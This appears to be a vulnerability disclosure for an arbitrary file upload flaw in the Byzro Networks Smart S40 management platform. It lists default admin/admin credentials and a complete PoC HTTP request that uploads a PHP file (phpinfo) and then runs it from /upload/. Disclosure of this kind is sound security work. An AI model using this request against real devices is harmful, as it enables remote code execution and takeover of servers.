There is a file upload vulnerability in Byzro Networks Smart S40 management platform

version:S40

Vulnerability location:/useratte/web.php

The import branch is entered in the code, and the uploaded files in lines 36-38 of the code do not have any suffix restrictions, causing arbitrary files to be uploaded.

![image](https://github.com/b51s77/cve/assets/50482841/8a358b44-9694-4807-853f-5d1511f5ebbd)

1. The login interface is as shown in the figure.
admin/admin

![image](https://github.com/b51s77/cve/assets/50482841/f59c19d7-a9db-4ee1-bb4e-8cb8846c8ee8)

2. Construct a POC and directly upload the 1.php file.

POC
```
POST /useratte/web.php? HTTP/1.1
Host: ip:port
Cookie: PHPSESSID=cb5c0eb7b9fabee76431aaebfadae6db
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 597
Origin: https://ip:port
Referer: https://ip:port/sysmanage/licence.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="2.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

import
-----------------------------42328904123665875270630079328
```
![image](https://github.com/b51s77/cve/assets/50482841/bbe4ae4f-3fa4-46ab-9fa8-b1e736fd4c30)

3.Visit /upload/2.php

![image](https://github.com/b51s77/cve/assets/50482841/d3f0d71d-db63-4d0f-8441-0a680928a2e8)




